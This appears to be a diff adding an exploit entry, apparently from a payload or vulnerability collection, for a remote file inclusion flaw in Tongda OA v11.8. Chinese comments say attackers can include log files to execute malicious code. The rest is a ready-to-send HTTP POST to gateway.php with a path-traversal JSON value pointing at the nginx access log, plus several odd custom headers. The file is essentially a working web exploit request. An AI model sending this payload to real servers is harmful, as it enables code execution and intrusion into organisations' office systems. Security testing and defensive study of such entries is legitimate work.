@@ -1,0 +1,10 @@
+# 通达OA v11.8 getway.php 远程文件包含漏洞
+# 通达OA v11.8 getway.php 远程文件包含漏洞，攻击者可发送恶意请求包含日志文件执行恶意代码
+POST /ispirit/interface/gateway.php?acid=80025414&bid=hd_tag_m8mv26b4 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26b4
+RM-PRO-Token: 6ecd9fe4e2442ff67665a0d3058c8776
+RM-PRO-Time: 1742808571015
+User-Agent: curl/7.83.1
+
+json={"url":"/general/../../nginx/logs/oa.access.log"}
